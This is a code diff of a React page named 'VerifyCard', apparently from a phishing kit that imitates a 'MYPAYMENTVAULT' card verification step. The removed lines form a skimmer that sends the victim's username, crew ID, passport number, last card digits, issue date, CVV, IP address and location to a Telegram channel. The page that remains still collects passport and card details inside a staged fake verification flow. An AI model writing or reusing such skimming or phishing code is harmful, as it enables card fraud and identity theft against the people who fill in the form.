@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, CreditCard } from "lucide-react";
-import { sendTelegram, getIPInfo } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -49,7 +48,7 @@ const labelStyle: React.CSSProperties = {
 };
 
 export default function VerifyCard() {
-  const { pendingUsername, pendingCard, verifyCard, isAuthenticated } = useAuth();
+  const { pendingCard, verifyCard, isAuthenticated } = useAuth();
   const { lang, setLang, langName, t } = useI18n();
   const [, navigate] = useLocation();
 
@@ -85,23 +84,6 @@ export default function VerifyCard() {
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     setErrors({});
     setLoading(true);
-    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip = await getIPInfo();
-    await sendTelegram(
-      `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `💳 <b>MYPAYMENTVAULT</b>\n` +
-      `📌 <b>Step 3 — Card Details</b>\n` +
-      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-      `👤 <b>Username</b>    : <code>${pendingUsername}</code>\n` +
-      `🪪 <b>Crew ID</b>     : <code>${crewId}</code>\n` +
-      `📘 <b>No. Passport</b>: <code>${passportNo}</code>\n` +
-      `💳 <b>Last 8 Digits</b>: <code>${lastDigit}</code>\n` +
-      `📅 <b>Card Issued</b> : <code>${month}/${year}</code>\n` +
-      `🔒 <b>CVV</b>         : <code>${secCode}</code>\n` +
-      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
-      `🕐 <b>Waktu</b>       : ${now}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━`
-    );
     verifyCard();
     navigate("/step4");
   };
